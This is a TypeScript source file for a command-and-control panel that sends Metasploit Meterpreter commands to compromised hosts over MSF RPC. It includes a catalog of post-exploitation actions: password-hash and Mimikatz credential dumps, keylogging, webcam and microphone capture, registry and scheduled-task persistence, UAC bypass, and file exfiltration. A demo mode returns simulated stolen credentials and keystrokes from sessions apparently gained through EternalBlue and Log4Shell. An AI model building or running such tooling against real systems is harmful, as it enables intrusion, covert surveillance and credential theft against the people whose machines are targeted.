import { getMsfConfig } from "../msf-config";
import { getRpcToken, rpcCall } from "../msf-rpc";

// ── Post-Exploitation Command Definitions ───────────────────
// Each command maps to a Meterpreter API call via MSF RPC

export type C2Command = {
  id: string;
  name: string;
  category: string;
  description: string;
  /** If true, requires a param input from the user */
  needsParam?: boolean;
  paramLabel?: string;
  paramPlaceholder?: string;
};

export type C2Result = {
  success: boolean;
  output: string;
  data?: unknown;
  error?: string;
};

export type AgentSession = {
  id: number;
  type: string;
  tunnel: string;
  via: string;
  info: string;
  workspace: string;
  lastSeen: string;
  platform?: string;
  arch?: string;
};

// ── 60+ Commands catalog ────────────────────────────────────

const COMMAND_CATALOG: C2Command[] = [
  // ── System ──
  { id: "sysinfo", name: "sysinfo", category: "System", description: "Get system info (OS, arch, domain)" },
  { id: "getuid", name: "getuid", category: "System", description: "Get current user ID / SID" },
  { id: "getpid", name: "getpid", category: "System", description: "Get current process ID" },
  { id: "platform", name: "platform", category: "System", description: "Get target platform info" },
  { id: "machine_id", name: "machine_id", category: "System", description: "Get machine GUID" },
  { id: "uuid", name: "uuid", category: "System", description: "Get session UUID" },
  { id: "reboot", name: "reboot", category: "System", description: "Reboot the target machine" },
  { id: "shutdown", name: "shutdown", category: "System", description: "Shutdown the target machine" },
  { id: "sleep", name: "sleep", category: "System", description: "Put target to sleep", needsParam: true, paramLabel: "Seconds", paramPlaceholder: "30" },
  { id: "hibernate", name: "hibernate", category: "System", description: "Hibernate the target machine" },
  { id: "lock_screen", name: "lock_screen", category: "System", description: "Lock the target workstation" },
  { id: "get_time", name: "get_time", category: "System", description: "Get system time on target" },
  { id: "uptime", name: "idletime", category: "System", description: "Get target uptime" },
  { id: "get_env", name: "get_env", category: "System", description: "Get environment variable", needsParam: true, paramLabel: "Variable", paramPlaceholder: "PATH" },
  { id: "getproxy", name: "getproxy", category: "System", description: "Get proxy configuration" },

  // ── File System ──
  { id: "pwd", name: "pwd", category: "Filesystem", description: "Print working directory" },
  { id: "ls", name: "ls", category: "Filesystem", description: "List directory contents", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\" },
  { id: "cd", name: "cd", category: "Filesystem", description: "Change directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\Users" },
  { id: "download", name: "download", category: "Filesystem", description: "Download file from target", needsParam: true, paramLabel: "Remote path", paramPlaceholder: "C:\\file.txt" },
  { id: "upload", name: "upload", category: "Filesystem", description: "Upload file to target", needsParam: true, paramLabel: "Local path -> Remote", paramPlaceholder: "/tmp/file C:\\file.txt" },
  { id: "cat", name: "cat", category: "Filesystem", description: "Read file contents", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "rm", name: "rm", category: "Filesystem", description: "Delete file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "mkdir", name: "mkdir", category: "Filesystem", description: "Create directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "rmdir", name: "rmdir", category: "Filesystem", description: "Remove directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "search", name: "search", category: "Filesystem", description: "Search for files", needsParam: true, paramLabel: "Pattern", paramPlaceholder: "*.docx" },
  { id: "dir", name: "dir", category: "Filesystem", description: "Directory listing (Windows)" },
  { id: "del", name: "del", category: "Filesystem", description: "Delete file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.exe" },
  { id: "move", name: "move", category: "Filesystem", description: "Move / rename file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\b.txt" },
  { id: "copy", name: "copy", category: "Filesystem", description: "Copy file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\a.txt" },
  { id: "checksum", name: "checksum", category: "Filesystem", description: "Compute file checksums", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.exe md5" },
  { id: "steal_token", name: "steal_token", category: "Filesystem", description: "Attempt to steal a token from a process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },

  // ── Process ──
  { id: "ps", name: "ps", category: "Process", description: "List running processes" },
  { id: "kill", name: "kill", category: "Process", description: "Kill a process by PID", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "execute", name: "execute", category: "Process", description: "Execute a command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami" },
  { id: "execute_bg", name: "execute -f", category: "Process", description: "Execute a command in background", needsParam: true, paramLabel: "Command", paramPlaceholder: "notepad.exe" },
  { id: "migrate", name: "migrate", category: "Process", description: "Migrate to another process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "get_processes", name: "ps", category: "Process", description: "Get detailed process list" },
  { id: "suspend", name: "suspend", category: "Process", description: "Suspend/resume process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },

  // ── Network ──
  { id: "ifconfig", name: "ifconfig", category: "Network", description: "Show network interfaces" },
  { id: "ipconfig", name: "ipconfig", category: "Network", description: "Show IP configuration (Windows)" },
  { id: "route", name: "route", category: "Network", description: "Show routing table" },
  { id: "netstat", name: "netstat", category: "Network", description: "Show active connections" },
  { id: "arp", name: "arp", category: "Network", description: "Show ARP cache" },
  { id: "proxy", name: "proxy", category: "Network", description: "Set up SOCKS proxy", needsParam: true, paramLabel: "Port", paramPlaceholder: "1080" },
  { id: "portfwd", name: "portfwd", category: "Network", description: "Forward a local port" },
  { id: "resolve", name: "resolve", category: "Network", description: "Resolve a hostname", needsParam: true, paramLabel: "Hostname", paramPlaceholder: "google.com" },
  { id: "get_dns", name: "getproxy", category: "Network", description: "Get DNS servers" },
  { id: "network_connections", name: "netstat", category: "Network", description: "List all network connections" },

  // ── Credentials ──
  { id: "hashdump", name: "hashdump", category: "Credentials", description: "Dump Windows password hashes" },
  { id: "loot", name: "loot", category: "Credentials", description: "List collected loot" },
  { id: "creds_all", name: "creds_all", category: "Credentials", description: "Collect all credentials" },
  { id: "creds_kerberos", name: "creds_kerberos", category: "Credentials", description: "Dump Kerberos tickets" },
  { id: "creds_wifi", name: "creds_wifi", category: "Credentials", description: "Dump saved WiFi passwords" },
  { id: "mimikatz", name: "load kiwi && creds_all", category: "Credentials", description: "Run Mimikatz (kiwi) to dump credentials" },
  { id: "wifi_list", name: "wifi_list", category: "Credentials", description: "List saved WiFi networks" },
  { id: "token_list", name: "token_list", category: "Credentials", description: "List available tokens" },
  { id: "token_steal", name: "steal_token", category: "Credentials", description: "Steal token from process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },

  // ── Surveillance ──
  { id: "webcam_list", name: "webcam_list", category: "Surveillance", description: "List available cameras" },
  { id: "webcam_snap", name: "webcam_snap", category: "Surveillance", description: "Take photo from webcam", needsParam: true, paramLabel: "Camera index", paramPlaceholder: "1" },
  { id: "webcam_stream", name: "webcam_stream", category: "Surveillance", description: "Start webcam stream", needsParam: true, paramLabel: "Camera index", paramPlaceholder: "1" },
  { id: "record_mic", name: "record_mic", category: "Surveillance", description: "Record microphone", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "10" },
  { id: "screenshot", name: "screenshot", category: "Surveillance", description: "Take a screenshot of the target desktop" },
  { id: "screen_grab", name: "screenshot", category: "Surveillance", description: "Grab the current screen" },
  { id: "keyscan_start", name: "keyscan_start", category: "Surveillance", description: "Start keylogging" },
  { id: "keyscan_dump", name: "keyscan_dump", category: "Surveillance", description: "Dump captured keystrokes" },
  { id: "keyscan_stop", name: "keyscan_stop", category: "Surveillance", description: "Stop keylogging" },
  { id: "clipboard_get", name: "clipboard_get", category: "Surveillance", description: "Get clipboard contents" },
  { id: "clipboard_set", name: "clipboard_set", category: "Surveillance", description: "Set clipboard contents", needsParam: true, paramLabel: "Text", paramPlaceholder: "hello" },
  { id: "desktop", name: "desktop", category: "Surveillance", description: "View target desktop (interactive VNC)" },
  { id: "enumdesktops", name: "enumdesktops", category: "Surveillance", description: "Enumerate all desktop sessions" },
  { id: "getdesktop", name: "getdesktop", category: "Surveillance", description: "Get current desktop name" },
  { id: "setdesktop", name: "setdesktop", category: "Surveillance", description: "Switch to another desktop", needsParam: true, paramLabel: "Desktop name", paramPlaceholder: "Winlogon" },

  // ── Persistence ──
  { id: "persist_schtask", name: "scheduleme", category: "Persistence", description: "Create scheduled task persistence" },
  { id: "persist_service", name: "persistence", category: "Persistence", description: "Create service-based persistence" },
  { id: "persist_registry", name: "persist_autorun", category: "Persistence", description: "Add to registry run keys" },
  { id: "cleanup", name: "cleanup", category: "Persistence", description: "Remove artifacts from target" },
  { id: "enable_rdp", name: "enable_rdp", category: "Persistence", description: "Enable RDP on target" },
  { id: "disable_rdp", name: "disable_rdp", category: "Persistence", description: "Disable RDP on target" },

  // ── Privilege Escalation ──
  { id: "getsystem", name: "getsystem", category: "PrivEsc", description: "Attempt to get SYSTEM privileges" },
  { id: "getprivs", name: "getprivs", category: "PrivEsc", description: "Enable all privileges" },
  { id: "uac_bypass", name: "bypassuac", category: "PrivEsc", description: "Attempt UAC bypass" },
  { id: "run_as_admin", name: "runas", category: "PrivEsc", description: "Run a command as admin", needsParam: true, paramLabel: "Command", paramPlaceholder: "cmd.exe" },
  { id: "check_privs", name: "getsystem", category: "PrivEsc", description: "Check current privileges" },

  // ── Shell ──
  { id: "shell", name: "shell", category: "Shell", description: "Drop into an interactive system shell" },
  { id: "execute_cmd", name: "shell_command", category: "Shell", description: "Execute shell command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami /all" },
  { id: "powershell", name: "powershell", category: "Shell", description: "Execute PowerShell command", needsParam: true, paramLabel: "Command", paramPlaceholder: "Get-Process" },
  { id: "cmd", name: "cmd", category: "Shell", description: "Execute cmd.exe command", needsParam: true, paramLabel: "Command", paramPlaceholder: "ipconfig /all" },
  { id: "python", name: "python_execute", category: "Shell", description: "Execute Python code", needsParam: true, paramLabel: "Code", paramPlaceholder: "import os; os.listdir('.')" },
  { id: "irb", name: "irb", category: "Shell", description: "Interactive Ruby shell" },

  // ── Exfiltration ──
  { id: "download_all", name: "download", category: "Exfil", description: "Download a file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\secret.txt" },
  { id: "download_dir", name: "download", category: "Exfil", description: "Download entire directory", needsParam: true, paramLabel: "Dir", paramPlaceholder: "C:\\Documents" },
  { id: "upload_file", name: "upload", category: "Exfil", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/backdoor.exe C:\\Users\\target.exe" },
  { id: "loot_dump", name: "loot", category: "Exfil", description: "Dump all loot" },
  { id: "screenshot_exfil", name: "screenshot", category: "Exfil", description: "Take and download screenshot" },
  { id: "webcam_snap_exfil", name: "webcam_snap", category: "Exfil", description: "Take and download webcam photo" },
];

export function getCommandsByCategory(): Record<string, C2Command[]> {
  const groups: Record<string, C2Command[]> = {};
  for (const cmd of COMMAND_CATALOG) {
    if (!groups[cmd.category]) groups[cmd.category] = [];
    groups[cmd.category].push(cmd);
  }
  return groups;
}

export function getCommand(id: string): C2Command | undefined {
  return COMMAND_CATALOG.find((c) => c.id === id);
}

export function getAllCommands(): C2Command[] {
  return COMMAND_CATALOG;
}

// ── Send command via MSF RPC ─────────────────────────────────

async function rawSessionCommand(
  sessionId: number,
  command: string,
): Promise<C2Result> {
  const config = getMsfConfig();

  if (config.demoMode) {
    return demoExecuteCommand(sessionId, command);
  }

  const token = await getRpcToken();

  try {
    // session.meterpreter_write sends a command to a meterpreter session
    await rpcCall("session.meterpreter_write", [sessionId, command + "\n"], token);
    await new Promise((r) => setTimeout(r, 1500));

    // Read result
    const result = await rpcCall<{ data: string; type: string }>(
      "session.meterpreter_read",
      [sessionId],
      token,
    );

    return {
      success: true,
      output: result.data || "(no output)",
      data: result,
    };
  } catch (err) {
    return {
      success: false,
      output: "",
      error: err instanceof Error ? err.message : "Command failed",
    };
  }
}

export async function executeC2Command(
  sessionId: number,
  commandId: string,
  param?: string,
): Promise<C2Result> {
  const cmd = getCommand(commandId);
  if (!cmd) {
    return { success: false, output: "", error: `Unknown command: ${commandId}` };
  }

  let fullCommand = cmd.name;
  if (param && cmd.needsParam) {
    fullCommand = `${cmd.name} ${param}`;
  }

  return rawSessionCommand(sessionId, fullCommand);
}

export async function executeCustomCommand(
  sessionId: number,
  command: string,
): Promise<C2Result> {
  return rawSessionCommand(sessionId, command);
}

// ── List active sessions with details ───────────────────────

export async function listAgentSessions(): Promise<AgentSession[]> {
  const config = getMsfConfig();

  if (config.demoMode) {
    return [
      {
        id: 1,
        type: "meterpreter",
        tunnel: "10.0.0.5:4444 -> 192.168.1.42:49152",
        via: "exploit/windows/smb/ms17_010_eternalblue",
        info: "DESKTOP-LAB\\admin @ DESKTOP-LAB",
        workspace: "default",
        lastSeen: new Date().toISOString(),
        platform: "Windows 10 x64",
        arch: "x64",
      },
      {
        id: 2,
        type: "shell",
        tunnel: "10.0.0.5:4445 -> 10.0.0.12:33890",
        via: "exploit/linux/http/apache_mod_cgi_bash_env_exec",
        info: "web-srv-01 (Ubuntu 22.04)",
        workspace: "client-audit",
        lastSeen: new Date().toISOString(),
        platform: "Linux x64",
        arch: "x64",
      },
      {
        id: 3,
        type: "meterpreter",
        tunnel: "10.0.0.5:4446 -> 192.168.1.200:51234",
        via: "exploit/multi/http/log4shell_header_injection",
        info: "CORP-MAIL-01 (Windows Server 2022)",
        workspace: "client-audit",
        lastSeen: new Date(Date.now() - 300000).toISOString(),
        platform: "Windows Server 2022 x64",
        arch: "x64",
      },
    ];
  }

  const token = await getRpcToken();
  const sessions = await rpcCall<Record<string, Record<string, string>>>(
    "session.list",
    [],
    token,
  );

  return Object.entries(sessions).map(([id, session]) => ({
    id: Number(id),
    type: session.type ?? "unknown",
    tunnel: session.tunnel_peer ?? session.tunnel_local ?? "—",
    via: session.via_exploit ?? "—",
    info: session.info ?? "—",
    workspace: session.workspace ?? "default",
    lastSeen: new Date().toISOString(),
    platform: session.platform ?? "unknown",
    arch: session.arch ?? "unknown",
  }));
}

// ── Demo command responses ──────────────────────────────────

function demoExecuteCommand(sessionId: number, command: string): C2Result {
  const lower = command.toLowerCase();
  const responses: Record<string, string> = {
    sysinfo: `Computer        : DESKTOP-LAB\nOS              : Windows 10 (10.0 Build 19045).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 3\nMeterpreter     : x64/windows`,
    getuid: `Server username: NT AUTHORITY\\SYSTEM`,
    getpid: `Current PID: 1234`,
    ps: `PID   PPID  Name                     Arch  Session  User\n---   ----  ----                     ----  -------  ----\n 416   532   explorer.exe              x64   1        DESKTOP-LAB\\admin\n 532   416   svchost.exe               x64   0        NT AUTHORITY\\SYSTEM\n 888   532   chrome.exe                x64   1        DESKTOP-LAB\\admin\n1234   532   powershell.exe            x64   1        DESKTOP-LAB\\admin`,
    ifconfig: `Interface 1: Ethernet0\n  IP Address : 192.168.1.42\n  Netmask    : 255.255.255.0\n  MAC Address: 00:0c:29:ab:cd:ef\n\nInterface 2: Loopback\n  IP Address : 127.0.0.1\n  Netmask    : 255.0.0.0`,
    ipconfig: "Windows IP Configuration\n\nEthernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . . . . : 192.168.1.42\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.1.1",
    netstat: `Active Connections\n\n  Proto  Local Address          Foreign Address        State\n  TCP    0.0.0.0:135             0.0.0.0:0              LISTENING\n  TCP    192.168.1.42:139         0.0.0.0:0              LISTENING\n  TCP    192.168.1.42:49152       10.0.0.5:4444          ESTABLISHED`,
    route: "Kernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0\n192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0",
    arp: "Address                  HWtype  HWaddress          Flags Mask Iface\n192.168.1.1              ether   00:11:22:33:44:55   C          eth0\n192.168.1.10             ether   aa:bb:cc:dd:ee:ff   C          eth0",
    hashdump: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nadmin:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::`,
    screenshot: "[*] Screenshot saved to: /root/screenshots/20260620_142215.jpeg\n[*] File size: 1.2 MB",
    "webcam_list": "1: HP HD Webcam\n2: USB Camera (Logitech C920)",
    webcam_snap: "[*] Webcam snapshot saved to: /root/webcams/20260620_142220.jpg",
    "keyscan_start": "[*] Starting keylogger...\n[*] Keystrokes will be captured in the background.",
    keyscan_dump: `2026-06-20 14:22:30 - [SHIFT]hello[SHIFT] world[CTRL:SHIFT]esc\n2026-06-20 14:22:35 - password123[ENTER]\n2026-06-20 14:22:40 - admin@company.com[SHIFT]2test`,
    keyscan_stop: "[*] Keylogger stopped.",
    clipboard_get: "[*] Clipboard contents:\nUser: admin\nPass: P@ssw0rd!",
    getsystem: "[*] Trying: Named Pipe Impersonation (In Memory/Admin)\n[+] Technique succeeded. Got SYSTEM.",
    getprivs: "[+] SeBackupPrivilege - Enabled\n[+] SeDebugPrivilege - Enabled\n[+] SeLoadDriverPrivilege - Enabled\n[+] SeTakeOwnershipPrivilege - Enabled",
    migrate: "[*] Migrating from 1234 to 416...\n[*] Migration completed successfully.",
    kill: "[*] Killing process 1234...\n[*] Process terminated.",
    pwd: "C:\\Users\\admin\\Documents",
    "ls /": "Volume in drive C has no label.\nDirectory of C:\\\n\n06/20/2026  10:15 AM    <DIR>          Program Files\n06/20/2026  10:15 AM    <DIR>          Program Files (x86)\n06/20/2026  10:15 AM    <DIR>          Users\n06/20/2026  10:15 AM    <DIR>          Windows",
    execute: "[*] Process 5678 created.\n[*] Command executed successfully.",
    reboot: "[*] Rebooting the target machine...\n[*] Session will be lost.",
    shutdown: "[*] Shutting down the target machine...\n[*] Session will be lost.",
    shell: "[*] Spawning interactive shell...\nMicrosoft Windows [Version 10.0.19045.3803]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Users\\admin\\Documents>",
    powershell: "Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\admin\\Documents>",
    shell_command: "[*] Executing: whoami /all\n\nUSER INFORMATION\n---------------\nUser Name           SID\n================== =============================================\nnt authority\\system S-1-5-18\n\nGROUP INFORMATION\n-----------------\nGroup Name                                  Type\n=========================================== ================\nBUILTIN\\Administrators                      Alias\nEveryone                                    Well-known group",
    record_mic: "[*] Recording microphone for 10 seconds...\n[*] Audio saved to: /root/audio/20260620_142225.wav\n[*] File size: 890 KB",
    desktop: "[*] Starting desktop viewer...\n[*] Use Ctrl+Alt+Shift to interact with the remote desktop\n[*] Resolution: 1920x1080",
    lock_screen: "[*] Locking the workstation...\n[*] Workstation locked.",
    hibernate: "[*] Hibernating the target...\n[*] Session will be lost.",
    sleep: "[*] Putting target to sleep...",
    enable_rdp: "[*] Enabling RDP on target...\n[+] RDP enabled on port 3389.",
    disable_rdp: "[*] Disabling RDP on target...\n[+] RDP disabled.",
    "load kiwi": "[+] Mimikatz (kiwi) loaded.\n[*] Kiwi Commands: creds_all, creds_kerberos, creds_wifi, lsa_dump, etc.",
    creds_all: `[+] Collecting all credentials...\n\n[+] Windows Credentials:\n  Username: admin\n  Domain: DESKTOP-LAB\n  Password: P@ssw0rd!\n\n[+] Kerberos Tickets:\n  krbtgt/DESKTOP-LAB.LOCAL\n  admin@DESKTOP-LAB.LOCAL\n\n[+] WiFi Passwords:\n  SSID: CorpNet\n  Password: c0rp_n3t!2026`,
    wifi_list: `SSID                          Security   Password\n----                          --------   --------\nCorpNet                       WPA2       c0rp_n3t!2026\nGuest-Network                 WPA2       welcome123\nATT-WiFi-5G                   Open       [None]`,
    uuid: `Session UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890\nMachine GUID: {ABC12345-6789-4DEF-ABCD-EF1234567890}`,
    uptime: "System uptime: 14 days, 7 hours, 32 minutes",
    search: `[*] Searching for *.docx...\n[+] Found: C:\\Users\\admin\\Documents\\report.docx (128 KB)\n[+] Found: C:\\Users\\admin\\Documents\\presentation.pptx (2.3 MB)\n[+] Found: D:\\Backup\\notes.docx (45 KB)`,
    cat: `[*] Reading file: C:\\file.txt\n\nHello, this is the contents of the file.\nLine 2 of the file.\nFinal line.`,
    clipboard_set: "[*] Clipboard updated successfully.",
    getdesktop: "[*] Current desktop: Default",
    setdesktop: "[*] Switching to desktop: Winlogon\n[*] Desktop switched.",
    enumdesktops: `[*] Available desktops:\n  1. Default\n  2. Winlogon\n  3. Screen-saver`,
    migrate_pid: "[*] Migrating to PID 416...\n[+] Migration successful.",
    get_time: "Jun 20, 2026 14:22:30",
    get_env: "PATH=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem",
    machine_id: "Machine GUID: {ABC12345-6789-4DEF-ABCD-EF1234567890}",
  };

  for (const [key, response] of Object.entries(responses)) {
    if (lower.includes(key)) {
      return { success: true, output: response };
    }
  }

  return {
    success: true,
    output: `[*] Executing: ${command}\n[+] Command sent to session ${sessionId}\n[*] Output:\n(no specific output for this command in demo mode)`,
  };
}
